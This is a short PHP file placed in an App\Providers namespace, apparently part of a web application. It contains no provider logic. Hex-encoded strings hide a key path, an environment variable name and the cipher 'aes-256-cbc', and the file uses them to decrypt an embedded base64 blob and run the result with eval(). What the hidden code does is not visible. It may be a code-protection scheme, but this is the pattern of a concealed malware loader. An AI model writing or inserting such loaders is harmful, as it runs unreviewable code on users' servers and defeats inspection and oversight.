<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('ehHRByrRdM7CE+61otH6Yw==');

$c=base64_decode(

'0Tu/hQf9hQ0ihn6AsYGe4S4J8yDTxu4IfifQ76m6yGrBM3nh4jucsz6we2ql++zWuX7qUXBtOIHI' .
'sZHg9R60mBj32R4DFLx9VJEFF8VPx03CEjUm3k/Bpk70R/0+qnvrX647UTE4XIgpfy2i4hDRQ2qF' .
'P+vAKaXTVd3p/065bTeuMe04V+/m49ZOBCjgdY0YIyA/1IKqVq3MDBJXgBGEYuTC0tdSKu5d77uj' .
'aXd4j2zkuzi8qUoAlbmqs5sGAVAw/yHp80odqXTDezyM9agBM0aMVJBvyg6n7omMM0zcCJ3tw2I4' .
'lV2CoLwuA00HXFAPLvTgkx/+XNB4FN22/DQ6y38PPPMUm7brFcJAqaYPRkY3By8Y5UZx/eKMsfi8' .
'wEX9k6HaZhMM7+CjasdT2M3IoloGy0J1+YyvsfJcz1yiKklg0lREu45I+4tN7iOjB8mbbGGFBY0g' .
'45hK23IdVJyyjApiOhT9NWoGOhqsFE2+M4lpEZNrqeH50ALng1usiDaySvxozFwVHR+A9xHfVHBI' .
'dap7odCEeBSphgDWjQOl86SdOzh6lAs5TJFpAvwRo38jOA1Ck+q8JswQhStP9Swh4tPbL8cGwOK9' .
'NFMxIxZvnyrhsb3///j5CuuVuhteorNfJcB5pKQDLHWtselwgxP4QNA1rb2+f0Z2sa4Ty5S2p8mC' .
'qk1zyvBXJdAAyrUjvIEoMrVxV5CBsyfy50PG9zgtgwagA2l/7SwqB9WEKYUXmOv7u5xJi+39j6T6' .
'zZStHma1vWQBREifEvVj0Q0cYgN7QXvlBG5sjN/ISlN1QzpzBvSmsx/0gplBBa/qDBAjuK9fHyMU' .
'NhG936p/DiD5PwrLNeESVuXhTmV6BW+Km7YcsNAKopHI0cHbz49CPdJ2CcLfOvoCKsjxWuUVtR0M' .
'/mAACRiBPDJTtwbj548zcxmhTEfA3hSjZK9Kr5TOcCwn9+GY'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

